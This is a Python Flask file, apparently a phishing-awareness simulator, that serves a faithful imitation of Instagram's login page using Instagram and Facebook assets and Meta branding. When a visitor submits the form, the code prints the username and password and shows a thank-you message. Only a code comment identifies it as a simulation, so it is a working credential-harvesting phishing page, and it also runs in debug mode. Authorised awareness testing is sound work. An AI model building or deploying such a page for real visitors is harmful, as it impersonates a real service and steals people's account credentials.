# phishing_simulation/website_simulator.py
# Simulates a fake phishing website for awareness testing (Instagram style)

from flask import Flask, render_template_string, request

app = Flask(__name__)

INSTAGRAM_LOGIN_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
        body { background: #fafafa; font-family: 'Roboto', Arial, sans-serif; }
        .main { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }
        .container { width: 350px; background: #fff; border: 1px solid #dbdbdb; border-radius: 8px; margin-top: 32px; padding: 40px 40px 24px 40px; box-sizing: border-box; }
        .logo { display: block; margin: 36px auto 24px auto; width: 175px; }
        .input { width: 100%; margin-bottom: 6px; padding: 9px 0 7px 8px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 16px; }
        .button { width: 100%; background: #3897f0; color: #fff; border: none; padding: 8px 0; border-radius: 4px; font-weight: bold; margin-top: 8px; cursor: pointer; font-size: 15px; }
        .divider { display: flex; align-items: center; text-align: center; margin: 18px 0 18px 0; }
        .divider::before, .divider::after { content: ""; flex: 1; border-bottom: 1px solid #dbdbdb; }
        .divider:not(:empty)::before { margin-right: .75em; }
        .divider:not(:empty)::after { margin-left: .75em; }
        .fb-login { color: #385185; font-weight: 500; text-align: center; margin: 8px 0 16px 0; text-decoration: none; display: block; }
        .forgot { color: #00376b; text-decoration: none; font-size: 13px; display: block; text-align: right; margin-top: 12px; }
        .signup-box { width: 350px; background: #fff; border: 1px solid #dbdbdb; border-radius: 8px; margin: 10px auto 0 auto; padding: 20px 40px; text-align: center; font-size: 15px; }
        .signup-link { color: #3897f0; text-decoration: none; font-weight: 500; }
        .footer { text-align: center; margin-top: 32px; color: #8e8e8e; font-size: 14px; }
        .app-links { margin-top: 20px; text-align: center; }
        .app-links img { height: 40px; margin: 0 4px; }
    </style>
</head>
<body>
    <div class="main">
        <div class="container">
            <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram">
            <form method="post">
                <input class="input" name="username" placeholder="Phone number, username, or email" required><br>
                <input class="input" name="password" type="password" placeholder="Password" required><br>
                <button class="button" type="submit">Log In</button>
            </form>
            <div class="divider">OR</div>
            <a class="fb-login" href="#"><img src="https://static.xx.fbcdn.net/rsrc.php/v3/yx/r/-XF4FQcre_i.png" style="height:16px;vertical-align:middle;margin-right:8px;">Log in with Facebook</a>
            <a class="forgot" href="#">Forgot password?</a>
        </div>
        <div class="signup-box">
            Don't have an account? <a class="signup-link" href="#">Sign up</a>
        </div>
        <div class="app-links">
            <span>Get the app.</span><br>
            <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english_en.png/9fc4bab7565b.png" alt="Get it on App Store">
            <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english_en.png/6071ff4c484c.png" alt="Get it on Google Play">
        </div>
        <div class="footer">© 2024 Instagram from Meta</div>
    </div>
</body>
</html>
'''

@app.route('/', methods=['GET', 'POST'])
def fake_login():
    if request.method == 'POST':
        # Log credentials (for simulation only)
        username = request.form.get('username')
        password = request.form.get('password')
        print(f"Captured credentials: {username}, {password}")
        return "<h2>Thank you for submitting your credentials.</h2>"
    return render_template_string(INSTAGRAM_LOGIN_HTML)

if __name__ == "__main__":
    app.run(debug=True) 